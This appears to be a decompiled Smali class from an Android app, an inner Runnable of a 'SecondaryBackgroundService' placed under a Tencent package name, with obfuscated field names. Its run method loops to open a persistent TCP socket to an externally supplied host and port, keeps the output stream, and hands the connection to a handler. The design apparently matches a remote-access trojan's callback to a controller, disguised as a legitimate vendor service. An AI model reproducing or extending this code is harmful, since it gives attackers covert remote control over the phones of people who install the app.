.class Lcom/tencent/SecondaryBackgroundService$1;
.super Ljava/lang/Object;
.source "tunesxconcerningn106.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/tencent/SecondaryBackgroundService;->Completed_tunesxconcerningn106_App(Ljava/lang/String;I)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/tencent/SecondaryBackgroundService;

.field final synthetic val$h:Ljava/lang/String;

.field final synthetic val$p:I


# direct methods
.method constructor <init>(Lcom/tencent/SecondaryBackgroundService;Ljava/lang/String;I)V
    .locals 0
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .line 131
    iput-object p1, p0, Lcom/tencent/SecondaryBackgroundService$1;->this$0:Lcom/tencent/SecondaryBackgroundService;

    iput-object p2, p0, Lcom/tencent/SecondaryBackgroundService$1;->val$h:Ljava/lang/String;

    iput p3, p0, Lcom/tencent/SecondaryBackgroundService$1;->val$p:I

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 6

    const/4 v0, 0x0

    move v1, v0

    :cond_0
    const/4 v2, 0x3

    if-lt v1, v2, :cond_1

    .line 136
    iget-object v2, p0, Lcom/tencent/SecondaryBackgroundService$1;->this$0:Lcom/tencent/SecondaryBackgroundService;

    invoke-virtual {v2}, Lcom/tencent/SecondaryBackgroundService;->sp()V

    .line 139
    :cond_1
    :try_start_0
    iget-object v2, p0, Lcom/tencent/SecondaryBackgroundService$1;->val$h:Ljava/lang/String;

    invoke-static {v2}, Ljava/net/InetAddress;->getByName(Ljava/lang/String;)Ljava/net/InetAddress;

    move-result-object v2

    .line 140
    new-instance v3, Ljava/net/InetSocketAddress;

    iget v4, p0, Lcom/tencent/SecondaryBackgroundService$1;->val$p:I

    invoke-direct {v3, v2, v4}, Ljava/net/InetSocketAddress;-><init>(Ljava/net/InetAddress;I)V

    .line 141
    new-instance v2, Ljava/net/Socket;

    invoke-direct {v2}, Ljava/net/Socket;-><init>()V

    sput-object v2, Lcom/tencent/SecondaryBackgroundService;->s_tunesxconcerningn106_k:Ljava/net/Socket;

    .line 142
    sget-object v2, Lcom/tencent/SecondaryBackgroundService;->s_tunesxconcerningn106_k:Ljava/net/Socket;

    invoke-virtual {v2, v0}, Ljava/net/Socket;->setSoTimeout(I)V

    .line 143
    sget-object v2, Lcom/tencent/SecondaryBackgroundService;->s_tunesxconcerningn106_k:Ljava/net/Socket;

    const/4 v4, 0x1

    invoke-virtual {v2, v4}, Ljava/net/Socket;->setKeepAlive(Z)V

    .line 151
    sget-object v2, Lcom/tencent/SecondaryBackgroundService;->s_tunesxconcerningn106_k:Ljava/net/Socket;

    invoke-virtual {v2, v4}, Ljava/net/Socket;->setTcpNoDelay(Z)V

    .line 152
    sget-object v2, Lcom/tencent/SecondaryBackgroundService;->s_tunesxconcerningn106_k:Ljava/net/Socket;

    const v5, 0xea60

    invoke-virtual {v2, v3, v5}, Ljava/net/Socket;->connect(Ljava/net/SocketAddress;I)V

    .line 153
    iget-object v2, p0, Lcom/tencent/SecondaryBackgroundService$1;->this$0:Lcom/tencent/SecondaryBackgroundService;

    sget-object v3, Lcom/tencent/SecondaryBackgroundService;->s_tunesxconcerningn106_k:Ljava/net/Socket;

    invoke-virtual {v3}, Ljava/net/Socket;->isConnected()Z

    move-result v3

    iput-boolean v3, v2, Lcom/tencent/SecondaryBackgroundService;->ctd:Z

    .line 154
    iget-object v2, p0, Lcom/tencent/SecondaryBackgroundService$1;->this$0:Lcom/tencent/SecondaryBackgroundService;

    iget-boolean v2, v2, Lcom/tencent/SecondaryBackgroundService;->ctd:Z

    if-ne v2, v4, :cond_2

    .line 155
    sget-object v2, Lcom/tencent/SecondaryBackgroundService;->s_tunesxconcerningn106_k:Ljava/net/Socket;

    invoke-virtual {v2}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v2

    sput-object v2, Lcom/tencent/SecondaryBackgroundService;->o_tunesxconcerningn106_ut:Ljava/io/OutputStream;

    .line 156
    iget-object v2, p0, Lcom/tencent/SecondaryBackgroundService$1;->this$0:Lcom/tencent/SecondaryBackgroundService;

    iput-boolean v4, v2, Lcom/tencent/SecondaryBackgroundService;->Lo:Z

    .line 157
    iget-object v2, p0, Lcom/tencent/SecondaryBackgroundService$1;->this$0:Lcom/tencent/SecondaryBackgroundService;

    invoke-virtual {v2}, Lcom/tencent/SecondaryBackgroundService;->p_tunesxconcerningn106_r()V
    :try_end_0
    .catch Ljava/net/UnknownHostException; {:try_start_0 .. :try_end_0} :catch_2
    .catch Ljava/net/SocketException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    .line 171
    :catch_0
    iget-object v2, p0, Lcom/tencent/SecondaryBackgroundService$1;->this$0:Lcom/tencent/SecondaryBackgroundService;

    invoke-static {v2}, Lcom/tencent/SecondaryBackgroundService;->access$000(Lcom/tencent/SecondaryBackgroundService;)V

    goto :goto_0

    .line 169
    :catch_1
    iget-object v2, p0, Lcom/tencent/SecondaryBackgroundService$1;->this$0:Lcom/tencent/SecondaryBackgroundService;

    invoke-static {v2}, Lcom/tencent/SecondaryBackgroundService;->access$000(Lcom/tencent/SecondaryBackgroundService;)V

    goto :goto_0

    .line 161
    :catch_2
    iget-object v2, p0, Lcom/tencent/SecondaryBackgroundService$1;->this$0:Lcom/tencent/SecondaryBackgroundService;

    invoke-static {v2}, Lcom/tencent/SecondaryBackgroundService;->access$000(Lcom/tencent/SecondaryBackgroundService;)V

    :cond_2
    :goto_0
    const-wide/16 v2, 0x1

    .line 173
    :try_start_1
    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V
    :try_end_1
    .catch Ljava/lang/InterruptedException; {:try_start_1 .. :try_end_1} :catch_3

    :catch_3
    add-int/lit8 v1, v1, 0x1

    .line 175
    iget-object v2, p0, Lcom/tencent/SecondaryBackgroundService$1;->this$0:Lcom/tencent/SecondaryBackgroundService;

    iget-boolean v2, v2, Lcom/tencent/SecondaryBackgroundService;->ctd:Z

    if-eqz v2, :cond_0

    :goto_1
    return-void
.end method
